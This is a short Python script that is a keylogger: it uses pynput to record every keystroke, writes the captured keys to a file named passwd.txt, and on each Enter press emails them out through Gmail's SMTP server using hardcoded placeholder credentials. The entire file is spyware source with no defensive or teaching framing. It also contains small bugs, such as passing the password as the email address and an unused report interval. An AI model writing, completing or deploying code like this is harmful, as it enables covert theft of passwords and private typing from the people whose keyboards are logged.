import pynput
from pynput.keyboard import Key, Listener
import smtplib

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "exampleOfMail@gmail.com"
EMAIL_PASSWORD = "exampleOfPasswd"
keys = []


def writeFile(key):
    with open("passwd.txt", "a") as save:
            save.write(str(key))

def sendMail(email, password, message):
    server = smtplib.SMTP(host="smtp.gmail.com", port = 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def onPress(key):
    global keys
    keys.append(key)
    print(key)
    if key == Key.enter:
        writeFile(keys)
        sendMail(EMAIL_PASSWORD, EMAIL_PASSWORD, keys)
        keys = []
        
def onRelease(key):
    if key == Key.esc:
        return False

with Listener(on_press = onPress, on_release = onRelease) as listener:
    listener.join()